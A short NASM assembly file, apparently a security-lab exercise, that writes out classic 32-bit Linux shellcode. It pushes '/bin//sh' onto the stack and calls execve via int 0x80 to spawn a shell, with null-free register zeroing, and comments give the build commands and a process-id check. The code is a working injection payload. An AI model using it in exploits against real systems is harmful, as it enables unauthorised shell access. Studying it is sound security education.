section .text
global _start
    _start:
    ; Store the argument string on stack
    xor eax, eax ; clean register
    push eax ; Use 0 to terminate the string 
    push "//sh";
    push "/bin"
    mov ebx, esp ;Get the string address

    ;Construct the argument array argv[]
    push eax  ; argv[1]=0
    push ebx  ; arg[0] points to the cmd string I
    mov ecx, esp ; Get the address of argv[]

    ;Construct the env array
    xor edx, edx ; NO env variables

    ;Execute the command
    xor eax, eax ; eax = 0x00000000
    mov al, 0x0b ; eax = 0x0000000b
    int 0x80 ; Execute the command

; nasm -f elf32 -o shellcode.o shellcode.asm
; ld -o shellcode shellcode.o
; echo $$
; shellcode 
; echo $$